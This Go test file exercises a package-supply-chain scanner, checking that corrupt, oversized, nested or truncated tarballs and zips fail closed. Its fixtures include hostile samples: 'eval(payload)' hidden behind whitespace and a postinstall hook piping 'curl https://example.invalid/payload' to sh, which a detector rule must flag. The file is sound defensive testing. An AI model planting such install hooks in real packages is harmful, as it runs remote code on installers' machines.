package gate

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"io"
	"strings"
	"testing"
)

func plainTestTar(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var b bytes.Buffer
	w := tar.NewWriter(&b)
	for name, data := range files {
		if err := w.WriteHeader(&tar.Header{Name: name, Size: int64(len(data)), Mode: 0o644}); err != nil {
			t.Fatal(err)
		}
		if _, err := io.WriteString(w, data); err != nil {
			t.Fatal(err)
		}
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func gzipTestData(t *testing.T, data []byte) []byte {
	t.Helper()
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func zipTestData(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var b bytes.Buffer
	w := zip.NewWriter(&b)
	for name, data := range files {
		f, err := w.CreateHeader(&zip.FileHeader{Name: name, Method: zip.Store})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := io.WriteString(f, data); err != nil {
			t.Fatal(err)
		}
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func TestArchiveIncompleteInspectionFailsClosed(t *testing.T) {
	cleanTar := buildTarball(t, map[string]string{"index.js": "module.exports = 1;"})
	badGzipCRC := append([]byte(nil), cleanTar...)
	badGzipCRC[len(badGzipCRC)-8] ^= 1
	badZipCRC := zipTestData(t, map[string]string{"index.js": "unique-content-to-corrupt"})
	badZipCRC[bytes.Index(badZipCRC, []byte("unique-content-to-corrupt"))] ^= 1
	oversize := strings.Repeat(" ", maxArchiveFile+1) + "eval(payload)"
	for _, tc := range []struct {
		name  string
		data  []byte
		limit int64
	}{
		{"oversize tar file", buildTarball(t, map[string]string{"index.js": oversize}), defaultArchiveLimit},
		{"oversize zip file", zipTestData(t, map[string]string{"index.js": oversize}), defaultArchiveLimit},
		{"tar total budget", buildTarball(t, map[string]string{"a.js": strings.Repeat(" ", 2048), "b.js": strings.Repeat(" ", 2048)}), 3072},
		{"zip total budget", zipTestData(t, map[string]string{"a.js": strings.Repeat(" ", 2048), "b.js": strings.Repeat(" ", 2048)}), 3072},
		{"gzip checksum", badGzipCRC, defaultArchiveLimit},
		{"gzip truncated trailer", cleanTar[:len(cleanTar)-4], defaultArchiveLimit},
		{"zip checksum", badZipCRC, defaultArchiveLimit},
		{"tar truncated content", plainTestTar(t, map[string]string{"package/index.js": strings.Repeat("x", 1000)})[:600], defaultArchiveLimit},
		{"trailing gzip bomb", gzipTestData(t, append(plainTestTar(t, map[string]string{"package/index.js": "ok"}), bytes.Repeat([]byte{0}, 8192)...)), 4096},
		{"concatenated tar hidden payload", append(cleanTar, buildTarball(t, map[string]string{"index.js": "eval(payload)"})...), defaultArchiveLimit},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := scanTarball(tc.data, tc.limit); err == nil {
				t.Fatal("partial or corrupt archive was considered fully inspected")
			}
			s := NewStaticScan()
			s.MaxBytes = tc.limit
			s.Probes = probesWith("npm", stubProbe{tarballURL: "fixture", tarballContents: tc.data})
			result := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "fixture", Version: "1"})
			if result.Verdict != VerdictUnknown {
				t.Fatalf("incomplete scan should be Unknown, got %+v", result)
			}
			if allowed, _ := Lenient().Decide(PackageCheck{Results: []CheckResult{result, {Verdict: VerdictWarn}}}); allowed {
				t.Fatal("warning masked an incomplete archive scan")
			}
		})
	}
}

func TestArchiveNestedGemPayloadIsScanned(t *testing.T) {
	inner := gzipTestData(t, plainTestTar(t, map[string]string{
		"package.json": `{"scripts":{"postinstall":"curl https://example.invalid/payload | sh"}}`,
	}))
	outer := plainTestTar(t, map[string]string{"data.tar.gz": string(inner)})
	hits, err := scanTarball(outer, defaultArchiveLimit)
	if err != nil || patternSet(hits)["install-script-curl-pipe-shell"] != 3 {
		t.Fatalf("nested gem payload missed: %v, %+v", err, hits)
	}
}

func TestArchiveEntryCountAndDepthAreBounded(t *testing.T) {
	var b bytes.Buffer
	w := tar.NewWriter(&b)
	for i := 0; i <= maxArchiveEntries; i++ {
		if err := w.WriteHeader(&tar.Header{Name: "package/empty", Mode: 0o644}); err != nil {
			t.Fatal(err)
		}
	}
	w.Close()
	if _, err := scanTarball(b.Bytes(), defaultArchiveLimit); err == nil {
		t.Fatal("entry flood accepted")
	}
	data := buildTarball(t, map[string]string{"index.js": "ok"})
	for i := 0; i < 5; i++ {
		data = gzipTestData(t, plainTestTar(t, map[string]string{"data.tar.gz": string(data)}))
	}
	if _, err := scanTarball(data, defaultArchiveLimit); err == nil {
		t.Fatal("unbounded nested archives accepted")
	}
}

type copyingProbe struct{ stubProbe }

func (p copyingProbe) FetchTarball(_ context.Context, _ string, dst io.Writer) error {
	// Hide Reader.WriteTo so io.Copy attempts dst.ReadFrom if available.
	_, err := io.Copy(dst, struct{ io.Reader }{strings.NewReader(strings.Repeat("x", 8192))})
	return err
}

func TestArchiveDownloadCapCannotBeBypassedByIOCopy(t *testing.T) {
	if _, err := fetchArchive(context.Background(), copyingProbe{}, "fixture", 1024); err == nil {
		t.Fatal("io.Copy bypassed the download cap")
	}
}
